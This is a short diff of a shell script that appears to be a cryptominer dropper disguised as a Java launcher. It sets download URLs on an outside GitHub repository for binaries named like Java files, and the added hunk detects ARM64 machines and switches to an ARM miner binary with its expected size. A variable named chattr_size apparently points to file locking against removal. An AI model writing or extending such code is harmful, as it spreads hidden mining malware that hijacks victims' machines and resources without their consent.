@@ -56,6 +56,19 @@ config_url="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/config.js
 miner_url_backup="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/javae"
 chattr_size="8000" 
 
+ARCH=$(uname -m)
+
+case "$ARCH" in
+    aarch64|arm64)
+        miner_url="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/javaes"
+        miner_url_backup="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/javaes"
+        miner_size="8083328"
+        echo "Detected architecture: ARM64/aarch64-($ARCH)"
+        ;;
+    *)
+        echo "Warning: Unsupported architecture ($ARCH). Falling back to default download URL."
+        ;;
+esac
 
 sleep 1
 
